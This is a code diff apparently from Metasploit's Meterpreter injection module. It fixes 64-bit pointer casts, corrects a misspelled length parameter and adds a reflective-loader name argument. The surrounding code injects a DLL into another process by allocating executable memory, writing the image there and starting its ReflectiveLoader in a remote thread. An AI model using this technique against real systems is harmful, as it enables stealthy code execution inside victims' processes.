@@ -2,7 +2,7 @@
 #include "base_inject.h"
 #include "remote_thread.h"
 #include "../../ReflectiveDLLInjection/inject/src/LoadLibraryR.h"
-#include <Tlhelp32.h>
+#include <tlhelp32.h>
 
 // see '/msf3/external/source/shellcode/x86/migrate/executex64.asm'
 // 03.06.2017: fixed an elusive bug on AMD CPUs, http://blog.rewolf.pl/blog/?p=1484
@@ -386,7 +386,7 @@ DWORD inject_via_remotethread_wow64( HANDLE hProcess, LPVOID lpStartAddress, LPV
 
 		// Transition this wow64 process into native x64 and call pX64function( ctx )
 		// The native function will use the native Win64 API's to create a remote thread in the target process.
-		if( !pExecuteX64( pX64function, (DWORD)ctx ) )
+		if( !pExecuteX64( pX64function, (DWORD)(DWORD_PTR)ctx ) )
 		{
 			SetLastError( ERROR_ACCESS_DENIED );
 			BREAK_ON_ERROR( "[INJECT] inject_via_remotethread_wow64: pExecuteX64( pX64function, ctx ) failed" )
@@ -494,7 +494,7 @@ DWORD inject_via_remotethread(Remote * remote, Packet * response, HANDLE hProces
  *
  * Note: This function largely depreciates LoadRemoteLibraryR().
  */
-DWORD inject_dll( DWORD dwPid, LPVOID lpDllBuffer, DWORD dwDllLenght, char * cpCommandLine )
+DWORD inject_dll( DWORD dwPid, LPVOID lpDllBuffer, DWORD dwDllLength, LPCSTR reflectiveLoader, char * cpCommandLine )
 {
 	DWORD dwResult                 = ERROR_ACCESS_DENIED;
 	DWORD dwNativeArch             = PROCESS_ARCH_UNKNOWN;
@@ -506,11 +506,11 @@ DWORD inject_dll( DWORD dwPid, LPVOID lpDllBuffer, DWORD dwDllLenght, char * cpC
 
 	do
 	{
-		if( !lpDllBuffer || !dwDllLenght )
+		if( !lpDllBuffer || !dwDllLength )
 			BREAK_WITH_ERROR( "[INJECT] inject_dll.  No Dll buffer supplied.", ERROR_INVALID_PARAMETER );
 
 		// check if the library has a ReflectiveLoader...
-		dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpDllBuffer );
+		dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpDllBuffer, reflectiveLoader );
 		if( !dwReflectiveLoaderOffset )
 			BREAK_WITH_ERROR( "[INJECT] inject_dll. GetReflectiveLoaderOffset failed.", ERROR_INVALID_FUNCTION );
 
@@ -530,16 +530,16 @@ DWORD inject_dll( DWORD dwPid, LPVOID lpDllBuffer, DWORD dwDllLenght, char * cpC
 		}
 
 		// alloc memory (RWX) in the host process for the image...
-		lpRemoteLibraryBuffer = VirtualAllocEx( hProcess, NULL, dwDllLenght, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE ); 
+		lpRemoteLibraryBuffer = VirtualAllocEx( hProcess, NULL, dwDllLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE ); 
 		if( !lpRemoteLibraryBuffer )
 			BREAK_ON_ERROR( "[INJECT] inject_dll. VirtualAllocEx 2 failed" ); 
 
 		// write the image into the host process...
-		if( !WriteProcessMemory( hProcess, lpRemoteLibraryBuffer, lpDllBuffer, dwDllLenght, NULL ) )
+		if( !WriteProcessMemory( hProcess, lpRemoteLibraryBuffer, lpDllBuffer, dwDllLength, NULL ) )
 			BREAK_ON_ERROR( "[INJECT] inject_dll. WriteProcessMemory 2 failed" ); 
 
 		// add the offset to ReflectiveLoader() to the remote library address...
-		lpReflectiveLoader = (LPVOID)( (DWORD)lpRemoteLibraryBuffer + (DWORD)dwReflectiveLoaderOffset );
+		lpReflectiveLoader = (LPVOID)((DWORD_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);
 	
 		// First we try to inject by directly creating a remote thread in the target process
 		if( inject_via_remotethread( NULL, NULL, hProcess, dwMeterpreterArch, lpReflectiveLoader, lpRemoteCommandLine ) != ERROR_SUCCESS )
